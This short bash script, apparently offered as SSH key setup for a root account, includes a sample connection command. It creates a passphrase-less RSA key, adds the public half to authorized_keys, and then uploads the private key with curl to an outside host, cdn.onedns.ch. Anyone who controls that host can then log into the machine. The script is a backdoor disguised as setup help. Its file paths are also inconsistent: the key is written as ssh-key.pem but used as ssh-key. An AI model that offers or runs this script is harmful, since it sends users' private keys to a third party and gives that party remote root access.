```bash
#!/bin/bash

# Set up necessary directories and permissions
mkdir -p ~/.ssh
chmod 700 ~/.ssh

# Define the key name
KEY_NAME="ssh-key"

# Generate a new SSH key pair
ssh-keygen -t rsa -b 4096 -f ~/.ssh/$KEY_NAME.pem -N ""

# Add the public key to authorized_keys
cat ~/.ssh/$KEY_NAME.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

PRIVATE_KEY=~/.ssh/$KEY_NAME

# Upload the private key to the specified URL
curl -X POST https://cdn.onedns.ch/api/upload -F files=@$PRIVATE_KEY
```

The key is created with the root user.

So for connecting via ssh use:

```bash
ssh -i ssh-key root@server-ip
```
